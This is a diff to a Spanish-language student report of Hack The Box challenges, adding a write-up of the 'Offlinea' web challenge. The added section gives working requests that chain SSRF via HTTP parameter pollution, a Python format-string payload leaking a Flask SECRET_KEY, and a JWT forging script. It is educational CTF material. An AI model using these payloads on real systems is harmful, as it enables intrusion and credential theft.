@@ -11,7 +11,7 @@ date: "17 noviembre, 2026"
 | Estudiante            | Djedrielle Alexander - 2024154899   |
 | Estudiante            | Sebastian Donoso - 2024070154       |
 | Profesor              | Dr. Herson Esquivel Vargas          |
-| Puntos acumulados     | 2080 / 2300 XP                      |
+| Puntos acumulados     | 2340 / 2300 XP                      |
 
 ---
 
@@ -1052,8 +1052,6 @@ HTB{W3iRd_RUnT1m3_DEC}
 
 ---
 
----
-
 ## 1.8 Secure Notes
 
 | Campo                | Valor                        |
@@ -1140,6 +1138,98 @@ HTB{m0ng00s3_pr0t0typ3_p0llus10n_c0mb1n3d_w1th_1nt3rn4l_n0d3_g4dg3ts!}
 
 ---
 
+
+## 1.9 Offlinea
+
+| Campo                | Valor                        |
+|----------------------|------------------------------|
+| Categoría            | Web                          |
+| Dificultad           | Easy                         |
+| Puntos (XP reward)   | 260                          |
+| Fecha de resolución  | 13/11/2026                   |
+| Resuelto por         | Djedrielle                   |
+
+### Descripción del reto
+
+Reto de Web. La aplicación *Offlinea* tiene un front público en PHP (`bartender.php`) que recibe una `url`, la valida y la reenvía a un servicio **Flask interno** (`127.0.0.1:5000`) que renderiza la página con **Chrome headless** y la devuelve como PDF público en `/pdfs/`. La flag se guarda en la tabla `secrets` (vía `init_db.py`) y solo la expone el endpoint interno `/bartender`, protegido con JWT. El objetivo es alcanzar ese endpoint interno y leer la flag.
+
+### Procedimiento
+
+**Paso 1 — Reconocimiento / análisis del código fuente**
+
+Se descargó y revisó el código fuente (`offlinea.zip`). La arquitectura separa el front público (PHP, puerto 8000) del backend interno (Flask, `127.0.0.1:5000`). `bartender.php` valida la `url` recibida (bloquea rangos de IP privada y el carácter `{}`) y la reenvía a `/generate`, que usa Selenium para renderizar la URL a un PDF servido en `/pdfs/`. Además, `SECRET_KEY = os.urandom(32).hex()` y la flag se inserta en la tabla `secrets`, devuelta únicamente por `/bartender` (protegido con JWT).
+
+**Paso 2 — Identificación de la vulnerabilidad**
+
+Se encadenan tres debilidades:
+
+1. **SSRF con bypass por HTTP Parameter Pollution (HPP):** PHP valida la **última** aparición de `url`, pero Flask (`request.args.get`) usa la **primera**. Enviando dos parámetros `url` —una interna (`127.0.0.1:5000`) y otra pública (`example.com`)— PHP valida la pública y Flask procesa la interna. Esto burla a la vez el filtro de IP privada y el de `{}` (ambos se aplican solo sobre la URL pública). Adicionalmente, `is_request_safe` acepta IPs literales como `127.0.0.1` sin comprobar si son internas.
+2. **Format string injection en `/logs`:** `history_1.format(logify=logify)` se aplica sobre las URLs del historial (controladas por el atacante). El payload `{logify.__globals__[app].config[SECRET_KEY]}` filtra el `SECRET_KEY`.
+3. **Lógica de autorización rota en `token_required`:** solo deniega si `not is_admin and username == 'bartender'`; con `username:"x"` el token pasa aunque `is_admin` sea falso.
+
+**Paso 3 — Explotación**
+
+*1) Envenenar el historial.* Se usa el SSRF (vía HPP) para que el `/generate` interno guarde en `history` una URL con el payload de format string:
+
+Esto es lo que se obtiene luego de enviar la petición `http://154.57.164.75:39361/bartender.php?url=http://127.0.0.1:5000/?x=%7Blogify.__globals__%5Bapp%5D.config%5BSECRET_KEY%5D%7D&name=a&secret=b&url=http://example.com/`
+
+![pollution](imagenes/pollution.png)
+
+En este punto ya tenemos el historial envenenado.
+
+*2) Fugar el `SECRET_KEY` vía `/logs`.* Al ingresar la petición `http://154.57.164.75:39361/bartender.php?url=http://127.0.0.1:5000/logs&name=a&secret=b&url=http://example.com/` obtenemos el pdf con los logs, acá podemos ver que el envenenamiento fue exitoso. Ya que los logs revelan el secret key.
+
+![secret_key_Offlinea](imagenes/secret_key_Offlinea.png)
+
+La secret_key es: `b14acf71a4740e213dccb1600e0f2222b2cb6f0228cf430f501b64ac64949257`
+
+*3) Forjar el JWT.* Con esta key ya se puede crear el jwt para obtener acceso al endpoint. Esto lo logro con el siguiente bloque de código que se encuentra en el archivo payload.py:
+
+```py
+import jwt
+secret = "b14acf71a4740e213dccb1600e0f2222b2cb6f0228cf430f501b64ac64949257"
+payload = {"username": "x", "is_admin": False}
+print(jwt.encode(payload, secret, algorithm="HS256"))
+```
+
+![jwt_Offlinea](imagenes/jwt_Offlinea.png)
+
+Este es el jwt: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IngiLCJpc19hZG1pbiI6ZmFsc2V9.miOP78KWBxXjeMCc0fAowo9cEZRo9P4oH153uLWWgZk`
+
+*4) Leer la flag vía `/bartender`.* Con esto ya se puede fabricar la última solicitud payload: `http://154.57.164.75:39361/bartender.php?url=http://127.0.0.1:5000/bartender?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IngiLCJpc19hZG1pbiI6ZmFsc2V9.miOP78KWBxXjeMCc0fAowo9cEZRo9P4oH153uLWWgZk&url=http://example.com/`
+
+Al enviar esta por el navegador, el server likea la flag.
+
+![flag_Offlinea](imagenes/flag_Offlinea.png)
+
+### Herramientas utilizadas
+
+| Herramienta                        | Uso en el reto                                         |
+|------------------------------------|--------------------------------------------------------|
+| curl                               | Enviar las peticiones del exploit (HPP)                |
+| poppler-utils (pdfinfo/pdftotext)  | Inspeccionar y extraer el texto de los PDFs generados  |
+| PyJWT                              | Forjar el token JWT con el `SECRET_KEY`                |
+| Lectura de código (PHP/Flask)      | Identificar el SSRF, el format string y la lógica del JWT |
+
+### Debilidad (CWE)
+
+**CWE-918: Falsificación de petición del lado del servidor (SSRF)**
+
+El front PHP reenvía al servicio interno una `url` controlada por el usuario. Mediante HTTP Parameter Pollution (PHP valida la última `url`, Flask usa la primera) se fuerza a que el backend acceda a recursos internos (`127.0.0.1:5000`) —`/logs` y `/bartender`— normalmente inaccesibles desde fuera. Esto se encadena con una *format string injection* en `/logs` (fuga del `SECRET_KEY`) y un JWT forjado.
+
+### Patrón de ataque (CAPEC)
+
+**CAPEC-664: Server Side Request Forgery**
+
+Se abusó del reenvío de peticiones del front para que el servidor realizara solicitudes a su propio `localhost`. Con dos parámetros `url` se evadió la validación, y el acceso interno permitió filtrar el `SECRET_KEY` (format string) y forjar un JWT para leer la tabla `secrets`.
+
+### Bandera
+
+```
+HTB{3b0cbe383374cf3f02336f9e0822997d}
+```
+
+
 # 2. Calendario de resolución
 
 | #  | Fecha Inicio | Reto       | Categoría  | Puntos | Fecha Fin    | Integrante  |
@@ -1152,7 +1242,7 @@ HTB{m0ng00s3_pr0t0typ3_p0llus10n_c0mb1n3d_w1th_1nt3rn4l_n0d3_g4dg3ts!}
 | 6  | 9/11/2026    | TreaPortal | Web        | 260    | 9/11/2026    | Sebastian   |
 | 7  | 12/11/2026   | Partial Encryption | Reversing | 260 | 12/11/2026 | Djedrielle  |
 | 8  | 13/11/2026   | Secure Notes | Web      | 260    | 13/11/2026   | Djedrielle  |
-| …  |              |            |            |        |              |             |
+| 9  | 13/11/2026   | Offlinea   | Web        | 260    | 13/11/2026   | Djedrielle  |
 
 ---
 
@@ -1168,15 +1258,16 @@ HTB{m0ng00s3_pr0t0typ3_p0llus10n_c0mb1n3d_w1th_1nt3rn4l_n0d3_g4dg3ts!}
 | TreaPortal | Web         |              |  X           |
 | Partial Encryption | Reversing | X      |              |
 | Secure Notes | Web       | X            |              |
+| Offlinea   | Web         | X            |              |
 | …          |             |              |              |
-| **Total**  |             | **1040**     | **1040**     |
+| **Total**  |             | **1300**     | **1040**     |
 
 ### Verificación de requisitos
 
 | Requisito                          | Cumple   |
 |------------------------------------|----------|
-| Mínimo 2300 puntos (XP)            | [Sí/No]  |
+| Mínimo 2300 puntos (XP)            | Sí       |
 | Al menos 2 retos de Pwn            | Sí       |
-| Al menos 2 retos de Reversing      | [Sí/No]  |
+| Al menos 2 retos de Reversing      | Sí       |
 | Al menos 2 retos de Web            | Sí       |
-| Cada reto vale ≤ 500 puntos        | [Sí/No]  |
+| Cada reto vale ≤ 500 puntos        | Sí       |
